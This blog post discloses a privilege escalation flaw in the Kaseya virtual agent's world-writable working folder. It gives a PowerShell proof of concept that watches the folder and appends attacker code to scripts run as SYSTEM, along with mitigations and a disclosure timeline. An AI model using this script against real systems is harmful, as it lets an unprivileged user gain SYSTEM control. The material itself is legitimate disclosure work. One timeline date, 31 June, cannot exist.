---
layout: post
title: Kaseya privilege escalation
---

<h3>Introduction</h3>
So this is the first time I've written about a security issue I've found. Previously they have been non issues or in niche products.
I decided to write about this as the vendor was extermely unresponsive and going through previous product CVEs it seems to be a
trait of the company, ignore the issue until an exploit is published. The other reason is that if a company is using this product then generally every machine is at risk. 

I was quite happy with myself finding this issue but after discovery I looked to see if any other issues had been found. Sadly for me it looks like someone had found a similar issue but focused on a "Time of Call - Time of use" exploit with binaries - well here is the script version.
So I give you Kaseyas virtual agent.

<h3>Product</h3>
<h4>Kaysea virutal agent version 9.5</h4>
Kaseya virtual agent provides a web application interface for managing and monitoring IT assets via deployed agents.
Its a competitor for Microsofts system center and has a small portion of the market when compared with other vendors.
The agent itself looks to be a several tools bundled together instead of a dedicated agent leveraging host capabilities such as PowerShell, WScript as well as a couple of binaries like curl which are dropped.

<h3>Vulnerability</h3>
This is not really a new issue as such but more an extension of <a href="https://www.securityfocus.com/archive/1/541884/30/300/threaded">CVE-2017-12410</a> found by Filip Palian.
Where a fix was put in place for the original issue - it seems they didnt look at the root cause.
Excesive access to the working folder for an elevated account.

Kaseya agent has a working folder that defaults to <code class="highlighter-rouge">c:\kworking</code>.
It will pull scripts and binaries to this folder and execute them from disk.
By default the any authenticate user can read / write this folder.

Scripts are not authenticated and are written to disk prior to execution.
So if the folder is monitored for script files being dropped an attacker just needs to append their own code prior to execution.

<h3>Impact</h3>
Given that the Kaseya virtual agent is an IT managment tool, if the agent is deployed on a single machine within an organisation there is a good chance it has been deployed across the majority of the systems. However the vulnerability itself is reliant on code execution within the working folder and is dependant on scheduled tasks or an administrator executing tasks so the wait time can vary from 1 hour, a day or week.

If the working folder is commonly used with scripted commands this will be quite reliable for all systems - so the impact will vary dependant on an IT departments use of this.

<h3>Proof of concept</h3>
This PowerShell script will use a file monitor against the Kaseya working directory.
When a ps1 script drops it will then append to the end the command "Write-Host 'injected content'" which will run as SYSTEM.

<pre>
  <code>
      $folder = 'c:\kworking' 
      $filter = '*.ps1'                          

      $filesystem = New-Object IO.FileSystemWatcher $folder, $filter -Property @{IncludeSubdirectories = $false;NotifyFilter =  [IO.NotifyFilters]'FileName, LastWrite'}

      Register-ObjectEvent $filesystem Created -SourceIdentifier FileCreated -Action { 
          $path = $Event.SourceEventArgs.FullPath 
          "`nWrite-Host 'injected content'" | Out-File -Append -FilePath $path -Encoding utf8 
          Unregister-Event FileCreated
      }
  </code>
</pre>

Change the Write-Host command to the code to be executed or update the script to target other script drops such as vb script.

<h3>Mitigation</h3>
If you are using Kaseya all scripts should be signed and verified prior to execution eliminiating the ability to append arbitary commands. Additionally Kaseya should remove the excesive privileges on the working directory. 
Removing <code class="highlighter-rouge">Authenticated Users</code> permissions to write/append would be another step forward though I am unsure of the impact of the Kaysea product.

<h3>Timeline</h3>
<ul>
  <li>16-06-2019 :: Issue found</li>
  <li>18-06-2019 :: security@ emailed requsting steps to disclose</li>  
  <li>30-06-2019 :: CERT contacted due to non response of vendor from official email address</li>
  <li>31-06-2019 :: CERT still unable to contact vendor</li>
  <li>07-07-2019 :: CERT makes contact with vendor. Discover security@ address is not monitored by vendor</li>
  <li>20-08-2019 :: Vendor confirms receipt of details</li>
  <li>27-08-2019 :: Email sent indicating intention to disclose due to lack of response</li>
</ul>
